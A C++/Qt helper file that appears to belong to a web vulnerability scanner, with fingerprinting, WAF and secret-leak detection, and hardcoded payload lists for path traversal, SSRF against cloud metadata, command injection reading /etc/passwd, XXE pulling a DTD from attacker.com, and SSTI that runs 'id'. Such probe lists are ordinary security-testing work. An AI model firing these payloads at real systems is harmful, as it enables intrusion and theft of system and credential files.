#include "testhelpers.h"
#include <QCryptographicHash>
#include <QRegularExpression>
#include <QDateTime>
#include <QUrlQuery>
#include <QJsonDocument>
#include <QJsonObject>
#include <QJsonArray>

namespace TestHelpers {

// URL manipulation helpers
QString normalizeUrl(const QString &url) {
    QUrl parsed(url);
    QString path = parsed.path();
    if (path.isEmpty()) path = QStringLiteral("/");
    while (path.contains(QStringLiteral("//"))) path.replace(QStringLiteral("//"), QStringLiteral("/"));
    parsed.setPath(path);
    return parsed.toString();
}

QString extractDomain(const QString &url) {
    return QUrl(url).host();
}

QString extractPath(const QString &url) {
    return QUrl(url).path();
}

QStringList extractParameters(const QString &url) {
    QStringList params;
    QUrlQuery query(QUrl(url).query());
    const auto items = query.queryItems();
    for (int i = 0; i < items.size(); ++i)
        params << items.at(i).first;
    return params;
}

// Hash generation for deduplication
QString generateUrlHash(const QString &url) {
    return QString::fromLatin1(QCryptographicHash::hash(url.toUtf8(), QCryptographicHash::Md5).toHex());
}

QString generateResponseHash(const QByteArray &body) {
    return QString::fromLatin1(QCryptographicHash::hash(body, QCryptographicHash::Sha256).toHex().left(32));
}

// Content type detection
ContentType detectContentType(const QString &contentTypeHeader) {
    QString ct = contentTypeHeader.toLower();
    if (ct.contains(QStringLiteral("text/html"))) return ContentType::Html;
    if (ct.contains(QStringLiteral("application/json"))) return ContentType::Json;
    if (ct.contains(QStringLiteral("application/xml")) || ct.contains(QStringLiteral("text/xml"))) return ContentType::Xml;
    if (ct.contains(QStringLiteral("application/javascript")) || ct.contains(QStringLiteral("text/javascript"))) return ContentType::JavaScript;
    if (ct.contains(QStringLiteral("text/css"))) return ContentType::Css;
    if (ct.contains(QStringLiteral("image/"))) return ContentType::Image;
    if (ct.contains(QStringLiteral("application/pdf"))) return ContentType::Pdf;
    return ContentType::Unknown;
}

// Technology fingerprinting
TechStack detectTechnology(const QString &body, const QMap<QString, QString> &headers) {
    TechStack stack;

    // Server detection
    QString server = headers.value(QStringLiteral("server")).toLower();
    if (server.contains(QStringLiteral("apache"))) stack.webServer = QStringLiteral("Apache");
    else if (server.contains(QStringLiteral("nginx"))) stack.webServer = QStringLiteral("Nginx");
    else if (server.contains(QStringLiteral("iis"))) stack.webServer = QStringLiteral("IIS");
    else if (server.contains(QStringLiteral("lighttpd"))) stack.webServer = QStringLiteral("Lighttpd");

    // Framework detection
    QString powered = headers.value(QStringLiteral("x-powered-by")).toLower();
    if (powered.contains(QStringLiteral("php"))) stack.language = QStringLiteral("PHP");
    else if (powered.contains(QStringLiteral("asp.net"))) stack.language = QStringLiteral("ASP.NET");
    else if (powered.contains(QStringLiteral("express"))) stack.framework = QStringLiteral("Express.js");

    // CMS detection from body
    if (body.contains(QStringLiteral("wp-content")) || body.contains(QStringLiteral("wp-includes")))
        stack.cms = QStringLiteral("WordPress");
    else if (body.contains(QStringLiteral("/administrator/")) || body.contains(QStringLiteral("Joomla")))
        stack.cms = QStringLiteral("Joomla");
    else if (body.contains(QStringLiteral("Drupal.settings")) || body.contains(QStringLiteral("/sites/default/")))
        stack.cms = QStringLiteral("Drupal");
    else if (body.contains(QStringLiteral("Shopify.theme")))
        stack.cms = QStringLiteral("Shopify");
    else if (body.contains(QStringLiteral("data-wf-")))
        stack.cms = QStringLiteral("Webflow");

    // JavaScript framework detection
    if (body.contains(QStringLiteral("react")) || body.contains(QStringLiteral("__NEXT_DATA__")))
        stack.jsFramework = QStringLiteral("React");
    else if (body.contains(QStringLiteral("ng-app")) || body.contains(QStringLiteral("angular")))
        stack.jsFramework = QStringLiteral("Angular");
    else if (body.contains(QStringLiteral("Vue.")) || body.contains(QStringLiteral("v-bind")))
        stack.jsFramework = QStringLiteral("Vue.js");

    return stack;
}

// SQL injection detection patterns
QList<SqlInjectionPattern> getSqlInjectionPatterns() {
    return {
        {QStringLiteral("mysql"), QRegularExpression(QStringLiteral("SQL syntax.*MySQL|Warning.*mysql_|MySqlException")), 0.9},
        {QStringLiteral("postgresql"), QRegularExpression(QStringLiteral("PostgreSQL.*ERROR|Warning.*pg_|Npgsql\\.")), 0.9},
        {QStringLiteral("mssql"), QRegularExpression(QStringLiteral("SQL Server|SqlException|mssql_")), 0.9},
        {QStringLiteral("oracle"), QRegularExpression(QStringLiteral("ORA-\\d{5}|Oracle error|Warning.*oci_")), 0.9},
        {QStringLiteral("sqlite"), QRegularExpression(QStringLiteral("SQLite.*Exception|SQLITE_ERROR|Warning.*sqlite_")), 0.9},
        {QStringLiteral("generic"), QRegularExpression(QStringLiteral("sql syntax|syntax error.*sql|unclosed quotation")), 0.7},
    };
}

// XSS detection patterns
QList<XssPattern> getXssPatterns() {
    return {
        {QStringLiteral("script"), QRegularExpression(QStringLiteral("<script[^>]*>[^<]*alert\\s*\\(")), 0.95},
        {QStringLiteral("event"), QRegularExpression(QStringLiteral("on(error|load|click|mouseover)\\s*="), QRegularExpression::CaseInsensitiveOption), 0.8},
        {QStringLiteral("javascript"), QRegularExpression(QStringLiteral("javascript:\\s*alert")), 0.9},
        {QStringLiteral("svg"), QRegularExpression(QStringLiteral("<svg[^>]+onload")), 0.85},
        {QStringLiteral("img"), QRegularExpression(QStringLiteral("<img[^>]+onerror")), 0.85},
        {QStringLiteral("iframe"), QRegularExpression(QStringLiteral("<iframe[^>]+src\\s*=\\s*[\"']?javascript:")), 0.9},
    };
}

// Path traversal patterns
QStringList getPathTraversalPayloads() {
    return {
        QStringLiteral("../../../etc/passwd"),
        QStringLiteral("..\\..\\..\\windows\\win.ini"),
        QStringLiteral("....//....//....//etc/passwd"),
        QStringLiteral("..%252f..%252f..%252fetc/passwd"),
        QStringLiteral("..%c0%af..%c0%af..%c0%afetc/passwd"),
        QStringLiteral("/etc/passwd%00"),
        QStringLiteral("....\\....\\....\\windows\\win.ini"),
        QStringLiteral("%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"),
        QStringLiteral("..%5c..%5c..%5cwindows%5cwin.ini"),
        QStringLiteral("..%255c..%255c..%255cwindows%255cwin.ini"),
        QStringLiteral("..././..././..././etc/passwd"),
        QStringLiteral("..\\..\\..\\..\\..\\..\\windows\\win.ini"),
        QStringLiteral("file:///etc/passwd"),
        QStringLiteral("file://c:/windows/win.ini"),
    };
}

// SSRF payloads
QStringList getSsrfPayloads() {
    return {
        QStringLiteral("http://127.0.0.1"),
        QStringLiteral("http://localhost"),
        QStringLiteral("http://[::1]"),
        QStringLiteral("http://169.254.169.254/latest/meta-data/"),
        QStringLiteral("http://metadata.google.internal/"),
        QStringLiteral("http://169.254.169.254/metadata/v1/"),
        QStringLiteral("http://192.168.0.1"),
        QStringLiteral("http://10.0.0.1"),
        QStringLiteral("http://172.16.0.1"),
        QStringLiteral("http://0.0.0.0"),
        QStringLiteral("http://0"),
        QStringLiteral("http://127.1"),
        QStringLiteral("http://127.0.1"),
        QStringLiteral("gopher://127.0.0.1:25/"),
        QStringLiteral("dict://127.0.0.1:11211/"),
    };
}

// Command injection payloads
QStringList getCommandInjectionPayloads() {
    return {
        QStringLiteral(";cat /etc/passwd"),
        QStringLiteral("|cat /etc/passwd"),
        QStringLiteral("`cat /etc/passwd`"),
        QStringLiteral("$(cat /etc/passwd)"),
        QStringLiteral("&cat /etc/passwd"),
        QStringLiteral("&&cat /etc/passwd"),
        QStringLiteral("||cat /etc/passwd"),
        QStringLiteral(";type c:\\windows\\win.ini"),
        QStringLiteral("|type c:\\windows\\win.ini"),
        QStringLiteral("&type c:\\windows\\win.ini"),
        QStringLiteral("&&type c:\\windows\\win.ini"),
        QStringLiteral("||type c:\\windows\\win.ini"),
        QStringLiteral("\ncat /etc/passwd"),
        QStringLiteral("\r\ncat /etc/passwd"),
        QStringLiteral("a]||cat /etc/passwd"),
        QStringLiteral("a'|cat /etc/passwd"),
        QStringLiteral("a\"|cat /etc/passwd"),
        QStringLiteral("{{7*7}}"),
    };
}

// XXE payloads
QStringList getXxePayloads() {
    return {
        QStringLiteral("<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>"),
        QStringLiteral("<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///c:/windows/win.ini\">]><foo>&xxe;</foo>"),
        QStringLiteral("<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"http://attacker.com/xxe.dtd\">%xxe;]>"),
        QStringLiteral("<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"expect://id\">]><foo>&xxe;</foo>"),
        QStringLiteral("<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"php://filter/read=convert.base64-encode/resource=/etc/passwd\">]><foo>&xxe;</foo>"),
    };
}

// SSTI payloads
QStringList getSstiPayloads() {
    return {
        QStringLiteral("{{7*7}}"),
        QStringLiteral("${7*7}"),
        QStringLiteral("#{7*7}"),
        QStringLiteral("%{7*7}"),
        QStringLiteral("{{config}}"),
        QStringLiteral("{{self.__class__.__mro__[2].__subclasses__()}}"),
        QStringLiteral("${{7*7}}"),
        QStringLiteral("*{7*7}"),
        QStringLiteral("@{7*7}"),
        QStringLiteral("{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}"),
        QStringLiteral("{{''.__class__.__mro__[1].__subclasses__()}}"),
        QStringLiteral("${T(java.lang.Runtime).getRuntime().exec('id')}"),
    };
}

// Response analysis helpers
bool containsSensitiveData(const QString &content) {
    static const QRegularExpression patterns[] = {
        QRegularExpression(QStringLiteral("password\\s*[=:]\\s*['\"][^'\"]+['\"]"), QRegularExpression::CaseInsensitiveOption),
        QRegularExpression(QStringLiteral("api[_-]?key\\s*[=:]\\s*['\"][^'\"]+['\"]"), QRegularExpression::CaseInsensitiveOption),
        QRegularExpression(QStringLiteral("secret\\s*[=:]\\s*['\"][^'\"]+['\"]"), QRegularExpression::CaseInsensitiveOption),
        QRegularExpression(QStringLiteral("access[_-]?token\\s*[=:]\\s*['\"][^'\"]+['\"]"), QRegularExpression::CaseInsensitiveOption),
        QRegularExpression(QStringLiteral("private[_-]?key")),
        QRegularExpression(QStringLiteral("-----BEGIN RSA PRIVATE KEY-----")),
        QRegularExpression(QStringLiteral("-----BEGIN PRIVATE KEY-----")),
        QRegularExpression(QStringLiteral("AKIA[0-9A-Z]{16}")), // AWS Access Key
        QRegularExpression(QStringLiteral("AIza[0-9A-Za-z\\-_]{35}")), // Google API Key
        QRegularExpression(QStringLiteral("sk_live_[0-9a-zA-Z]{24}")), // Stripe Secret Key
    };
    for (const auto &re : patterns) {
        if (re.match(content).hasMatch()) return true;
    }
    return false;
}

bool isErrorPage(const QString &content, int statusCode) {
    if (statusCode >= 400 && statusCode < 600) return true;
    static const QStringList errorIndicators = {
        QStringLiteral("404 Not Found"),
        QStringLiteral("Page Not Found"),
        QStringLiteral("500 Internal Server Error"),
        QStringLiteral("Error occurred"),
        QStringLiteral("Exception"),
        QStringLiteral("Traceback"),
        QStringLiteral("stack trace"),
    };
    QString lower = content.toLower();
    for (const QString &ind : errorIndicators) {
        if (lower.contains(ind.toLower())) return true;
    }
    return false;
}

// Security header analysis
QStringList getMissingSecurityHeaders(const QMap<QString, QString> &headers) {
    QStringList missing;
    static const QStringList required = {
        QStringLiteral("Content-Security-Policy"),
        QStringLiteral("X-Content-Type-Options"),
        QStringLiteral("X-Frame-Options"),
        QStringLiteral("X-XSS-Protection"),
        QStringLiteral("Strict-Transport-Security"),
        QStringLiteral("Referrer-Policy"),
        QStringLiteral("Permissions-Policy"),
    };
    for (const QString &h : required) {
        bool found = false;
        for (auto it = headers.constBegin(); it != headers.constEnd(); ++it) {
            if (it.key().compare(h, Qt::CaseInsensitive) == 0) {
                found = true;
                break;
            }
        }
        if (!found) missing << h;
    }
    return missing;
}

// Cookie security analysis
CookieSecurityInfo analyzeCookie(const QString &cookieHeader) {
    CookieSecurityInfo info;
    QString lower = cookieHeader.toLower();
    info.hasSecure = lower.contains(QStringLiteral("secure"));
    info.hasHttpOnly = lower.contains(QStringLiteral("httponly"));
    info.hasSameSite = lower.contains(QStringLiteral("samesite"));
    info.hasPath = lower.contains(QStringLiteral("path="));
    info.hasDomain = lower.contains(QStringLiteral("domain="));
    info.hasExpires = lower.contains(QStringLiteral("expires=")) || lower.contains(QStringLiteral("max-age="));
    return info;
}

// Version comparison
int compareVersions(const QString &v1, const QString &v2) {
    QStringList parts1 = v1.split(QLatin1Char('.'));
    QStringList parts2 = v2.split(QLatin1Char('.'));
    int maxParts = qMax(parts1.size(), parts2.size());
    for (int i = 0; i < maxParts; ++i) {
        int n1 = i < parts1.size() ? parts1[i].toInt() : 0;
        int n2 = i < parts2.size() ? parts2[i].toInt() : 0;
        if (n1 < n2) return -1;
        if (n1 > n2) return 1;
    }
    return 0;
}

// Extract version from string
QString extractVersion(const QString &text) {
    static const QRegularExpression versionRe(QStringLiteral("(\\d+\\.\\d+(?:\\.\\d+)?)"));
    auto match = versionRe.match(text);
    return match.hasMatch() ? match.captured(1) : QString();
}

// Rate limiting detection
bool isRateLimited(int statusCode, const QMap<QString, QString> &headers) {
    if (statusCode == 429) return true;
    if (headers.contains(QStringLiteral("Retry-After"))) return true;
    if (headers.contains(QStringLiteral("X-RateLimit-Remaining"))) {
        int remaining = headers.value(QStringLiteral("X-RateLimit-Remaining")).toInt();
        if (remaining <= 0) return true;
    }
    return false;
}

// WAF detection
QString detectWaf(const QString &body, const QMap<QString, QString> &headers, int statusCode) {
    // Cloudflare
    if (headers.value(QStringLiteral("server")).contains(QStringLiteral("cloudflare"), Qt::CaseInsensitive))
        return QStringLiteral("Cloudflare");
    if (body.contains(QStringLiteral("Cloudflare Ray ID")))
        return QStringLiteral("Cloudflare");

    // AWS WAF
    if (headers.contains(QStringLiteral("x-amzn-waf-action")))
        return QStringLiteral("AWS WAF");

    // Akamai
    if (headers.value(QStringLiteral("server")).contains(QStringLiteral("AkamaiGHost")))
        return QStringLiteral("Akamai");

    // ModSecurity
    if (body.contains(QStringLiteral("ModSecurity")) || headers.value(QStringLiteral("server")).contains(QStringLiteral("mod_security")))
        return QStringLiteral("ModSecurity");

    // Incapsula/Imperva
    if (headers.contains(QStringLiteral("X-Iinfo")))
        return QStringLiteral("Imperva/Incapsula");

    // F5 BIG-IP
    if (headers.value(QStringLiteral("server")).contains(QStringLiteral("BigIP")))
        return QStringLiteral("F5 BIG-IP");

    // Sucuri
    if (headers.value(QStringLiteral("server")).contains(QStringLiteral("Sucuri")))
        return QStringLiteral("Sucuri");

    // Generic block detection
    if (statusCode == 403 && (body.contains(QStringLiteral("blocked")) || body.contains(QStringLiteral("forbidden"))))
        return QStringLiteral("Unknown WAF");

    return QString();
}

} // namespace TestHelpers
